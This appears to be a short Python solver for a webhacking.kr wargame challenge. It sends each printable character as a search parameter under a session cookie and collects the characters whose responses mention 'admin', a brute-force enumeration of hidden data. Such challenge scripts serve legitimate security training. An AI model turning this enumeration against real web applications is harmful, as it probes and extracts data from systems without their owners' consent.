import requests

session_id={'PHPSESSID':''}

result=''
for i in range(32,127):
	url = "http://webhacking.kr/challenge/web/web-33/index.php"		
	params={'search':str(chr(i))}
	response = requests.post(url=url,cookies=session_id,data=params)
	if "admin" in response.text:
		result+=chr(i)
	print(chr(i))
			
print("result : ",result)
